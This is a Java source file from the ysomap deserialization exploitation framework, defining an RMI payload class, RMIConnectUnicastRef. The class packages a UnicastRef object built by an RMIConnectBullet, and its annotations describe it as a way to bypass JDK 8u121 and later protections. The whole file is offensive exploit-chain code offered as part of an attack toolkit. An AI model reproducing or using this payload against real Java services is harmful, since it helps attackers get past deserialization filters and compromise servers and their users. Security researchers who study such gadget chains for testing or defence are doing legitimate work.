package ysomap.payloads.java.rmi;

import sun.rmi.server.UnicastRef;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.rmi.RMIConnectBullet;
import ysomap.common.annotation.*;
import ysomap.payloads.AbstractPayload;

@Payloads
@Targets({Targets.JDK, Targets.RMI})
@Require(bullets = {"RMIConnectBullet"}, param = false)
@Dependencies({"using to bypass jdk>=8u121", "`UnicastRef` object"})
@Authors({Authors.COKEBEER})
public class RMIConnectUnicastRef extends AbstractPayload<UnicastRef> {
    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof UnicastRef;
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return RMIConnectBullet.newInstance(args);
    }

    @Override
    public UnicastRef pack(Object obj) throws Exception {
        return (UnicastRef) obj;
    }
}
